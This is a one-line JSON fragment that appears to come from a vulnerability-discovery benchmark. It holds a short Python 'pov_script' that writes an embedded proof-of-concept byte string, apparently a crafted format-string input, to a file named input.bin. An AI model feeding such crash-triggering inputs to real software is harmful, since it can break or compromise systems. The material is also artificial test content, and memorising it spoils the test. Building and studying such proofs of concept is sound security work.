    "decoding": "<pov_script>\n\n# Use embedded PoC data\npoc_data = b'%\\x10%.11111111111s\\x10%9'\n\nwith open(\"input.bin\", \"wb\") as f:\n    f.write(poc_data)\n\n</pov_script>\n",
